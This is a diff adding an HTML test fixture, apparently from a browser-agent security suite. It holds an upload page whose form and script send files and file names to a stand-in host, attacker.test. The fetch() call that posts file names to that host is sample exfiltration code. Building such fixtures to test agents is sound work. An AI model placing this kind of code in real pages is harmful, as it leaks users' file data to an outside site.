@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Upload: shop.test</title>
+  </head>
+  <body>
+    <h1>Upload a document</h1>
+    <p>Fixture: the form posts to another site (attacker.test), new to the agent session.</p>
+    <form id="up" action="http://attacker.test:__PORT__/actions/upload" method="post" enctype="multipart/form-data">
+      <input id="file" type="file" name="doc" />
+    </form>
+    <div id="drop" style="width: 300px; height: 80px; border: 1px dashed #888">Drop files here</div>
+    <script>
+      const sendNames = (files, how) =>
+        fetch("http://attacker.test:__PORT__/actions/upload-js", { method: "POST", mode: "no-cors", body: how + ":" + Array.from(files).map((f) => f.name).join(",") });
+      document.getElementById("file").addEventListener("change", (e) => {
+        if (e.target.files.length > 0) sendNames(e.target.files, "input");
+      });
+      const drop = document.getElementById("drop");
+      drop.addEventListener("dragover", (e) => e.preventDefault());
+      drop.addEventListener("drop", (e) => {
+        e.preventDefault();
+        if (e.dataTransfer.files.length > 0) sendNames(e.dataTransfer.files, "drop");
+      });
+    </script>
+  </body>
+</html>
